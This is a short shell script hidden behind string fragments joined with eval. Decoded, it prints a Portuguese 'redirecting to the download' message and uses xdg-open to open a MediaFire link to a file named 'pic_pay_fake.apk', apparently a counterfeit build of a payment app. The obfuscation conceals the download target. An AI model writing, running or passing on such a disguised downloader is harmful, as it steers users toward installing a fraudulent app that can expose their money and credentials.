
z="
";Vz='ire.';Gz='do p';dz='pay_';Lz='.." ';Cz='echo';Uz='diaf';Az='clea';bz='sdo6';Rz='tps:';Zz='dtwq';gz='/fil';Mz='| lo';Xz='file';Iz='o do';Wz='com/';Yz='/vqh';hz='e"';az='i6i8';Dz=' "Di';Sz='//ww';Nz='lcat';Hz='ara ';Oz='xdg-';Qz=' "ht';Fz='onan';fz='.apk';Bz='r';Ez='reci';Kz='ad..';cz='/pic';Tz='w.me';Pz='open';Jz='wnlo';ez='fake';
eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$z$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz"